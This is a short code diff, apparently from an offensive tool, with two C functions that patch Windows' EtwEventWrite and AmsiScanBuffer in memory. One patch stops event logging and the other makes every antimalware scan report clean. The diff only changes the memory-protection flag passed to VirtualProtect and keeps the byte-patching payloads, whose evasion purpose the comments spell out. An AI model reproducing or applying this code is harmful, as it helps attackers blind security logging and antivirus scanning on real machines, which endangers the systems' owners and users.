@@ -62,7 +62,7 @@ void obf_bypass_etw(void) {
 
     /* Patch: ret (0xC3) — function returns immediately, no events logged */
     DWORD oldProtect = 0;
-    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
+    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_READWRITE, &oldProtect)) return;
     
     *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
     
@@ -84,7 +84,7 @@ void obf_bypass_amsi(void) {
     /* Patch: xor eax, eax; ret (0x31 0xC0 0xC3)
      * Returns 0 (S_OK = clean) regardless of what was scanned */
     DWORD oldProtect = 0;
-    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
+    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_READWRITE, &oldProtect)) return;
     
     unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
     memcpy(pAmsiScanBuffer, patch, 3);
